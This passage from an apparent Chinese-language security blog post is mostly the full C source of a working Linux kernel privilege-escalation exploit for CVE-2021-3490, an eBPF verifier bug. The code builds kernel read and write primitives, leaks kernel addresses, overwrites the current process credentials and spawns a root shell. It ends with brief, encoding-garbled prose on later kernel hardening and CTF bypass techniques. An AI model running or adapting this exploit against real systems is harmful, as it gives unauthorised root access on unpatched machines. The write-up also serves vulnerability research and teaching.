function_">read_arbitrary_addr_4_bytes</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        READ_ARBITRARY_ADDR(map_fd, idx), <br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .info.bpf_fd = map_fd,<br>        .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>        .info.info = (<span class="hljs-type">uint64_t</span>) &amp;info,<br>    &#125;;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> ret;<br><br>    ret = run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    data = info.btf_id;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    key = <span class="hljs-number">1</span>;<br>    value[<span class="hljs-number">0</span>] = addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = addr + <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    data = read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">2</span>);<br>    data &lt;&lt;= <span class="hljs-number">32</span>;<br>    data += read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> current_task, current_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">search_for_current_task</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> next_task = INIT_TASK + kernel_offset + <span class="hljs-number">0x818</span>;<br>    <span class="hljs-type">size_t</span> data;<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        next_task = read_arbitrary_addr(map_fd, next_task);<br>        data = read_arbitrary_addr(map_fd, next_task + <span class="hljs-number">0x2d0</span>);<br>    &#125; <span class="hljs-keyword">while</span> (data != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> next_task - <span class="hljs-number">0x818</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_ADDR(__map_fd)                         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV32_REG(VULN_REG, VULN_REG),              \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)</span><br><br><span class="hljs-type">size_t</span> map_addr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        LEAK_MAP_ADDR(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_OPS(__map_fd)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br><br><span class="hljs-type">size_t</span> map_ops_addr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_ops_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        LEAK_MAP_OPS(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu_limit */</span>                      \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite spin_lock_off */</span>                   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),               \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite max_entries */</span>                     \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite map type */</span>                        \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite the map-&gt;ops */</span>                    \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span><br><br><span class="hljs-type">size_t</span> fake_ops_addr;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_arbitrary_write_ops</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        MAKE_ARBITRARY_WRITE_OPS(map_fd),<br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> per_ops_ptr, value[<span class="hljs-number">0x1000</span>], value_idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops_data</span>;</span><br><br>    <span class="hljs-comment">/* save fake ops addr into map */</span><br>    fake_ops_addr = map_addr + <span class="hljs-number">0x110</span> + MAP_SIZE;<br><br>    <span class="hljs-comment">/* read ops */</span><br>    value_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bpf_map_ops); i += <span class="hljs-number">8</span>) &#123;<br>        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);<br>        value[value_idx++] = per_ops_ptr;<br>    &#125;<br><br>    <span class="hljs-comment">/* load ops */</span><br>    ops_data = (<span class="hljs-keyword">struct</span> bpf_map_ops *) value;<br>    ops_data-&gt;map_push_elem = (<span class="hljs-type">void</span>*) (ARRAY_MAP_GET_NEXT_KEY + kernel_offset);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* we&#x27;ll take fake ops&#x27;s addr from map */</span><br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = fake_ops_addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* hijack the map */</span><br>    run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">arbitrary_write_4_bytes_by_map</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> val)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> key;<br><br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = val - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], addr);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_MAP_DATA(__map_fd, __off)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, __off),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br><br><span class="hljs-comment">/* for debug only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_map_data</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> map_data[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x110</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>            TRIGGER_VULN(map_fd),<br>            MAKE_VULN_REG(map_fd),<br>            READ_MAP_DATA(map_fd, (<span class="hljs-number">0x110</span> - <span class="hljs-number">0x8</span> * i)), <br>            BPF_EXIT_INSN()<br>        &#125;;<br><br>        <span class="hljs-keyword">if</span> (run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to run bpf prog!&quot;</span>);<br>        &#125;<br><br>        key = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to look up the map!&quot;</span>);<br>        &#125;<br>        map_data[i] = value[<span class="hljs-number">0</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x200</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, map_data[i]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> map_fd;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> log_fd;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[=] CVE-2021-3490 explotation by arttnba3\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Creating new eBPF map...&quot;</span>);<br>    map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, MAP_SIZE, <span class="hljs-number">0x100</span>);<br>    <span class="hljs-keyword">if</span> (map_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Leaking addr of bpf_map.ops ...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (leak_map_ops_addr(map_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to run the eBPF prog!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Checking for leek...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Got bad value: %lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>        err_exit(<span class="hljs-string">&quot;FAILED to leak kernel info!&quot;</span>);<br>    &#125;<br><br>    map_ops_addr = value[<span class="hljs-number">0</span>];<br>    kernel_offset = map_ops_addr - ARRAY_MAP_OPS;<br>    kernel_base += kernel_offset;<br>    init_cred = INIT_CRED + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get array_map_ops leak: \033[0m%lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] kernel_offset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel_base: \033[0m%lx\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Leaking addr of bpf_map ...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (leak_map_addr(map_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to run the eBPF prog!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Checking for leek...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0xffff000000000000</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Got bad value: %lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>        err_exit(<span class="hljs-string">&quot;FAILED to leak addr of bpf_map!&quot;</span>);<br>    &#125;<br><br>    map_addr = value[<span class="hljs-number">0</span>] - <span class="hljs-number">0x110</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get addr of bpf_map: \033[0m%lx\n&quot;</span>, map_addr);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Search for current task_struct&#x27;s addr...&quot;</span>);<br>    current_task = search_for_current_task(map_fd);<br>    current_cred = read_arbitrary_addr(map_fd, current_task + <span class="hljs-number">0xad8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current task_struct&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current cred&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_cred);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Hijacking the bpf_map...&quot;</span>);<br>    make_arbitrary_write_ops(map_fd);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Overwriting the current-&gt;cred...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (arbitrary_write_4_bytes_by_map(map_fd, current_cred+<span class="hljs-number">4</span>+<span class="hljs-number">4</span>*i, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to ovwerwrite no.%d\033[0m\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to call ops-&gt;map_push_elem()!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* record the log in to file here */</span><br>    log_fd = open(<span class="hljs-string">&quot;./log.txt&quot;</span>, O_RDWR | O_CREAT);<br>    <span class="hljs-keyword">if</span> (log_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create log file!&quot;</span>);<br>    &#125;<br>    write(log_fd, bpf_log_buf, <span class="hljs-built_in">strlen</span>(bpf_log_buf));<br>    close(log_fd);<br><br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒï¼š</p><p><img src="https://s2.loli.net/2023/06/07/x9RAdDMlZr4wF65.png" alt="image.png"></p><blockquote><p>ç¬¬ä¸€æ¬¡çœŸæ­£ä»å¤´å¼€å§‹åš eBPF ç›¸å…³çš„åˆ©ç”¨ï¼Œè¯´å®è¯è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œä¸è¿‡è™šæ‹Ÿæœºçš„å„ç§å®ç°ç»†èŠ‚ç¡®å®æ¯”æƒ³è±¡ä¸­è¦åºå¤§å¾—å¤šï¼ˆ<del>é‚£ä¸€å¤©ï¼Œa3 ç»ˆäºå›å¿†èµ·æœ¬ç§‘é˜¶æ®µåšç”¨æˆ·æ€ vm pwn é€†å‘åŠå¤©é€†åˆ°å¤´å¤§çš„ç—›è‹¦</del>ï¼‰</p></blockquote><h2 id="Extra-New-ALU-Sanitation-bypass"><a href="#Extra-New-ALU-Sanitation-bypass" class="headerlink" title="Extra. New ALU Sanitation bypass"></a>Extra. New ALU Sanitation bypass</h2><p>åœ¨ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0">è¿™ä¸ª commit</a> ä¸­ ALU Sanitation åˆå¾—åˆ°äº†è¿›ä¸€æ­¥çš„åŠ å¼ºï¼š</p><ul><li><code>alu_limit</code> çš„è®¡ç®—æ–¹å¼å‘ç”Ÿäº†æ”¹å˜ï¼Œä¸æ˜¯ä½¿ç”¨æŒ‡é’ˆå¯„å­˜å™¨çš„å½“å‰ä½ç½®ï¼Œè€Œæ˜¯ä½¿ç”¨ä¸€ä¸ª <code>offset</code> å¯„å­˜å™¨</li><li>è¢«è®¤ä¸ºæ˜¯å¸¸æ•°çš„å¯„å­˜å™¨èµ‹å€¼<strong>ä¼šè¢«ç›´æ¥æ›´æ”¹ä¸ºå¸¸é‡èµ‹å€¼</strong></li></ul><p>è¿™ä¸¤ä¸ªæ–°ç‰¹æ€§çš„å¼•å…¥<strong>ä½¿å¾—æœ¬æ–‡æ‰€ç”¨çš„æ”»å‡»æ–¹æ³•è¿‘ä¹å®Œå…¨å¤±æ•ˆ</strong>ï¼Œä¸è¿‡è¿™å¹¶ä¸ä»£è¡¨æˆ‘ä»¬ä¸èƒ½å®Œæˆåˆ©ç”¨ï¼Œåœ¨ <a href="https://cjovi.icu/WP/1604.html">D^3CTF2022-d3bpf-v2</a> ä¸­æ¥è‡ª vidar-team çš„ chuj å¸ˆå‚…å±•ç¤ºäº†ä¸€ä¸ªæ–°çš„æŠ€å·§â€”â€”ç”±äº <code>bpf_skb_load_bytes()</code> ä¼šå°†ä¸€ä¸ª <code>sk_buff</code> çš„æ•°æ®è¯»åˆ°æ ˆä¸Šï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿è¡Œæ—¶ä¸º 1ã€verifier ç¡®ä¿¡ä¸º 0 çš„å¯„å­˜å™¨æ„é€ ä¸€ä¸ªè¾ƒé•¿çš„ <code>len</code> å‚æ•°ï¼Œ<strong>ä»è€Œä½¿å¾—æ•°æ®æ‹·è´æ—¶å‘ç”Ÿæ ˆæº¢å‡º</strong></p><p>æˆ‘ä»¬æˆ–è®¸è¿˜éœ€è¦é¢å¤–çš„åŠæ³•æ³„éœ²å†…æ ¸åœ°å€ï¼Œä¸€ä¸ªå¯è¡Œçš„æ–¹å¼æ˜¯ç›´æ¥é€ æˆ kernel oops åé€šè¿‡ dmesg æ³„éœ²å‡ºå†…æ ¸ä¿¡æ¯ï¼Œè¿™ä¸ªæŠ€å·§å¯¹äºæ€»ä¼šè®¾ç½® <code>oops=panic</code> çš„ CTF é¢˜å¹¶ä¸å¯ç”¨ï¼Œä½†æ˜¯<strong>å¤§éƒ¨åˆ†çš„çœŸå®ä¸–ç•Œç¯å¢ƒå…¶å®éƒ½ä¸ä¼šåœ¨ soft panic å‘ç”Ÿæ—¶ç›´æ¥ panic</strong> 